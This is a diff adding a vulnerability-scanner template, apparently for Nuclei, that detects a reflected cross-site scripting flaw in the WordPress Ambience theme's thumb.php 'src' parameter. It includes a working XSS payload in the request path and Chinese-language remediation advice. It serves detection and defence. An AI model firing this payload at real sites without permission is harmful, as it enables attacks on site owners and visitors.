@@ -1,0 +1,29 @@
+id: wp-ambience-xss
+info:
+  name: WordPress Theme Ambience - 'src' Reflected Cross-Site Scripting (XSS)
+  author:
+  - l0ne1y
+  description: "WordPress Theme Ambience ‘src’参数跨站脚本漏洞   \nAmbience是WordPress软件基金会的一个简单的个人博客主题。\n\nWordPress的Ambience主题中存在跨站脚本漏洞，该漏洞源于程序没有正确验证用户提交的输入。当用户浏览被影响的网站时，其浏览器将执行攻击者提供的任意代码，这可能导致攻击者窃取基于cookie的身份认证并发起其它攻击。"
+  severity: medium
+  remediation: |-
+    1、建议用户到官方获取最新补丁或者最新版本程序：https://wordpress.org/plugins/wordfence/
+
+    临时修复方案：
+    1、对输入(和URL参数)进行过滤，对输出进行编码，白名单和黑名单结合。也就是对提交的所有内容进行过滤，对url中的参数进行过滤，过滤掉会导致脚本执行的相关内容；然后对动态输出到页面的内容进行html编码，使脚本无法在浏览器中执行。虽然对输入过滤可以被绕过，但是也还是会拦截很大一部分的XSS攻击；最后对字符进行白名单或者黑名单限制。
+requests:
+- matchers:
+  - type: word
+    part: body
+    words:
+    - <body onload=alert(1)>
+  - type: word
+    part: header
+    words:
+    - text/html
+  - type: status
+    status:
+    - 200
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/wp-content/themes/ambience/thumb.php?src=%3Cbody%20onload%3Dalert(1)%3E.jpg'
+  method: GET
